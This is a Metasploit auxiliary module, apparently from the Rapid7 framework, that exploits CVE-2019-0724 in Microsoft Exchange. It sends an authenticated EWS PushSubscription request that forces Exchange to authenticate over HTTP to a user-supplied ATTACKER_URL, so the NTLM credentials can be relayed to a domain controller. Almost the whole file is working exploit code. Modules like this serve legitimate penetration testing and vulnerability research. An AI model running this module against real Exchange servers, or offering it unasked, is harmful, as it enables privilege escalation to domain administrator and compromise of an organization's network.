##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/ntlm/message'
require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'           => 'Microsoft Exchange Privilege Escalation Exploit',
      'Description'    => %q{
        This module exploits a privilege escalation vulnerability found in Microsoft Exchange - CVE-2019-0724
        Execution of the module will force Exchange to authenticate to an arbitrary URL over HTTP via the Exchange PushSubscription feature.
        This allows us to relay the NTLM authentication to a Domain Controller and authenticate with the privileges that Exchange is configured.
        The module is based on the work by @_dirkjan,
      },
      'Author'         => [
        '_dirkjan',         # Discovery and PoC
        'Petros Koutroumpis' # Metasploit
      ],
      'References'      =>
         [
           [ 'CVE', '2019-0724' ],
           [ 'URL', 'https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/' ]
         ],
       'DefaultOptions' =>
        {
          'SSL' => true,
          'RPORT' => 443
        },
      'License'        => MSF_LICENSE,
      'DisclosureDate' => '2019-01-21'
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, "Username of any domain user with a mailbox on Exchange"]),
        OptString.new('PASSWORD', [ true, "Password or password hash (in LM:NT format) of the user"]),
        OptString.new('DOMAIN', [ true, "The Active Directory domain name"]),
        OptString.new('TARGETURI', [ true, "Exchange Web Services API endpoint", "/EWS/Exchange.asmx" ]),
        OptString.new('EXCHANGE_VERSION', [ true, "Version of Exchange (2013|2016)", "2016" ]),
        OptString.new('ATTACKER_URL', [ true, "Attacker URL", nil ])
      ])
  end

  def run

    domain = datastore['DOMAIN']
    uri = datastore['TARGETURI']
    exchange_version = datastore['EXCHANGE_VERSION']
    attacker_url = datastore['ATTACKER_URL']

    req_data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + "\r\n"
    req_data += "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\">" + "\r\n"
    req_data += "<soap:Header>" + "\r\n"
    req_data += "<t:RequestServerVersion Version=\"Exchange"+exchange_version+"\" />" + "\r\n"
    req_data += "</soap:Header>" + "\r\n"
    req_data += "<soap:Body>" + "\r\n"
    req_data += "<m:Subscribe>" + "\r\n"
    req_data += "<m:PushSubscriptionRequest SubscribeToAllFolders=\"true\">" + "\r\n"
    req_data += "<t:EventTypes>" + "\r\n"
    req_data += "<t:EventType>NewMailEvent</t:EventType>" + "\r\n"
    req_data += "<t:EventType>ModifiedEvent</t:EventType>" + "\r\n"
    req_data += "<t:EventType>MovedEvent</t:EventType>" + "\r\n"
    req_data += "</t:EventTypes>" + "\r\n"
    req_data += "<t:StatusFrequency>1</t:StatusFrequency>" + "\r\n"
    req_data += "<t:URL>"+attacker_url+"</t:URL>" + "\r\n"
    req_data += "</m:PushSubscriptionRequest>" + "\r\n"
    req_data += "</m:Subscribe>" + "\r\n"
    req_data += "</soap:Body>" + "\r\n"
    req_data += "</soap:Envelope>" + "\r\n"

    http = nil

    http = Rex::Proto::Http::Client.new(
      rhost,
      rport.to_i,
      {},
      ssl,
      ssl_version,
      proxies,
      datastore['USERNAME'],
      datastore['PASSWORD']
    )

    http.set_config({ 'preferred_auth' => 'NTLM' })
    http.set_config({ 'domain' => domain })
    add_socket(http)


    req = http.request_raw({
      'uri' => uri,
      'method' => 'POST',
      'ctype' => 'text/xml; charset=utf-8',
      'headers' => {
            'Accept' => 'text/xml'
       },
      'data' => req_data
    })

    begin
      res = http.send_recv(req)
      xml = res.get_xml_document
      http.close
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT, ::Rex::HostUnreachable
      print_error("Connection failed")
    rescue OpenSSL::SSL::SSLError, OpenSSL::Cipher::CipherError
      print_error "SSL negotiation failed"
    end

    if res.nil?
      fail_with(Failure::Unreachable, 'Connection failed')
    end

    if res.code == 401
      fail_with(Failure::NoAccess, 'Server returned HTTP status 401 - Authentication failed')
    end

    if xml.nil?
      fail_with(Failure::UnexpectedReply, "Empty reply from server")
    end

    if res.code == 500 && xml.text.include?("ErrorInvalidServerVersion")
      fail_with(Failure::BadConfig, "Server does not accept this Exchange dialect. Specify a different Exchange version")
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Server returned HTTP #{res.code}: #{xml.text}")
    end

    print_good("Exchange returned HTTP status 200 - Authentication was successful")

    if xml.text.include? "ErrorMissingEmailAddress"
      fail_with(Failure::BadConfig, "The user does not have a mailbox associated. Try a different user.")
    end

    unless xml.text.include? "NoError"
      fail_with(Failure::Unknown, "Unknown error. Response: #{xml.text}")
    end

    print_good("API call was successful")

  end
end
